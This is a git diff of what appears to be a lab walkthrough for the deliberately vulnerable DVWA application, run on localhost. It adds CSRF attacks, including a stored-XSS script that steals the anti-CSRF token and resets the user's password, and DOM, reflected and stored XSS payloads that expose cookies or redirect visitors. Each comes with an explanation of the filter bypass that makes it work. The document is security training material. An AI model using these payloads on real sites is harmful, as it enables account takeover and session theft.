@@ -68,23 +68,25 @@ Image: <br>
 Explanation why it worked: The API for password reset did not consider how it was being triggered. <br>
 Explanation why it failed at higher levels: The API checks that it is being triggered by the same site. 
 
-<!-- curl -A 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0' 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change#' -->
-
 ### Security Level: Medium
 Payload: `curl -v --referer "http://localhost:8080/vulnerabilities/csrf/" "http://localhost:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change#" -b "PHPSESSID=r0mns51mv27k5ot51g8fea50h1; security=medium"` <br>
 Result: Password gets updated <br>
 Image: <br>
 ![csrf-med](images/csrf/csrf-med.png)
-Explanation why it worked: We set the referrer header ourselves to be the one expected, allowing us to get through.
+Explanation why it worked: We set the referrer header ourselves to be the one expected, allowing us to get through. <br>
 Explanation why it failed at higher levels: A unique CSRF token is required for the request.
 
-<!-- ### Security Level: High
-Payload: `|ls`
-Result: Able to run commands on system and via contents of filesystem.
+### Security Level: High
+Payload: On low difficulty, on XSS (Stored) I created an entry with name: `hack` and contents:
+```
+<a href="javascript:void(0)" onclick="(async()=>{let r=await fetch('../csrf/'),h=await r.text(),t=h.split(`'user_token' value='`)[1].split(`'`)[0],u=`../csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=${t}`,z=await fetch(u);console.log(await z.text())})()">Exploit</a>
+```
+The payload had to be compacted as the input had a length limit. Now we can go back to high difficulty. Then when the user clicks this link, the payload fetches the csrf page, gets the user_token, and creates a new fetch request to change the password with the obtained user token.
+Result: Password gets updated to `hacked`.
 Image: <br>
-![Command-injection-high](images/command-injection/command-injection-high.png)
-Explanation why it worked: The `| ` character had an extra space after. So if we just write it without space, it won't get replaced, allowing us to use it for command injection.
-Explanation why it failed at higher levels: The extra space issue was properly dealt. Actually, the input was checked to ensure that is numbers only. -->
+![csrf-high](images/csrf/csrf-high.png)
+Explanation why it worked: When the user clicks on the button on the stored XSS, a fetch request is made using the users cookies, so the server gives the corresponding user_token, which the xss sends back along with updated password request. <br>
+Explanation why it failed at higher levels: At a higher level, the user's password is needed, which can not be spoofed, even if we hijack the user's session.
 
 ## File Inclusion
 ### Security Level: Low 
@@ -226,6 +228,73 @@ Generation method: Unix timestamp of session creation time<br>
 
 ### Security Level: High
 Generation method: Increment from 0 and then apply md5 hash<br>
+
+## XSS (DOM)
+### Security Level: Low 
+Payload: `url: http://127.0.0.1:8080/vulnerabilities/xss_d/?default=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(document.cookie)%3E`<br>
+Result: Cookies are shown in an alert<br>
+Image: ![xss-dom-low](images/xss-dom/xss-dom-low.png)<br>
+Explanation why it worked: There was no check on the URL parameters being sent by the user.<br>
+Explanation why it failed at higher levels: The backend checks that the value must be from a set of whitelisted values.
+
+### Security Level: Medium
+Payload: `url: http://127.0.0.1:8080/vulnerabilities/xss_d/?default=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(document.cookie)%3E`<br>
+Result: Cookies are shown in an alert<br>
+Image: ![xss-dom-med](images/xss-dom/xss-dom-med.png)<br>
+Explanation why it worked: The URL check was only against `<script>` tags, but there are other ways to trigger Javascript code inside a `document.write`.<br>
+Explanation why it failed at higher levels: The backend checks that the value must be from a set of whitelisted values.
+
+### Security Level: High
+Payload: `url: http://127.0.0.1:8080/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(document.cookie)%3C/script%3E`<br>
+Result: Cookies are shown in an alert<br>
+Image: ![xss-dom-high](images/xss-dom/xss-dom-high.png)<br>
+Explanation why it worked: The PHP does not read beyond the #, but the Javascript does. <br>
+Explanation why it failed at higher levels: The browser encodes the URL parameters to stop it from functioning as a script.
+
+## XSS (Reflected)
+### Security Level: Low 
+Payload: Name:`<script> alert(document.cookie) </script>`<br>
+Result: The cookies are output in an alert. <br>
+Image: ![xss-refl-low](images/xss-reflected/xss-refl-low.png)<br>
+Explanation why it worked: There was no check on the input being provided.<br>
+Explanation why it failed at higher levels: Checks against `<script>` tags.
+
+### Security Level: Medium
+Payload: Name: `<img src="pwn" onerror=alert(document.cookie)>`<br>
+Result: The cookies are output in an alert. <br>
+Image: ![xss-refl-med](images/xss-reflected/xss-refl-med.png)<br>
+Explanation why it worked: The URL check was only against `<script>` tags, but there are other ways to trigger Javascript code inside a `document.write`.<br>
+Explanation why it failed at higher levels: The special characters in the input are encoded to stop it from functioning as a script.
+
+
+### Security Level: High
+Payload: Name: `<img src="pwn" onerror=alert(document.cookie)>`<br>
+Result: The cookies are output in an alert. <br>
+Image: ![xss-refl-high](images/xss-reflected/xss-refl-high.png)<br>
+Explanation why it worked: The URL check was only against `<script>` tags, but there are other ways to trigger Javascript code inside a `document.write`.<br>
+Explanation why it failed at higher levels: The special characters in the input are encoded to stop it from functioning as a script.
+
+## XSS (Stored)
+### Security Level: Low 
+Payload: Name: `rick roll`, Message: `<script> window.location="https://www.youtube.com/watch?v=dQw4w9WgXcQ" </script>`<br>
+Result: On loading XSS (Stored) page, redirected to youtube video.<br>
+Image: ![xss-stored-low](images/xss-stored/xss-stored-low.png)<br>
+Explanation why it worked: There is no check on the input. It is inserted directly into the database and page without any preprocessing.<br>
+Explanation why it failed at higher levels: Special characters in message are encoded to stop it from functioning as a script.
+
+### Security Level: Medium
+Payload: Name: `<img src=x onerror=window.location="https://www.youtube.com/watch?v=dQw4w9WgXcQ">`, Message: `rick rolled`<br>
+Result: On loading XSS (Stored) page, redirected to youtube video.<br>
+Image: ![xss-stored-low](images/xss-stored/xss-stored-low.png)<br>
+Explanation why it worked: The check on the name is weak. Only checks for exact match of `script` tag.<br>
+Explanation why it failed at higher levels: Special characters in message are encoded to stop it from functioning as a script.
+
+### Security Level: High
+Payload: Name: `<img src=x onerror=window.location="/">`, Message: `go back`<br>
+Result: On loading XSS (Stored) page, redirected to home page.<br>
+Image: ![xss-stored-high](images/xss-stored/xss-stored-high.png)<br>
+Explanation why it worked: The check on the name was only against `<script>` tags, but there are other ways to execute Javascript. <br>
+Explanation why it failed at higher levels: Special characters in both name and message are encoded to stop it from functioning as a script.
 
 ## Template
 ### Security Level: Low 
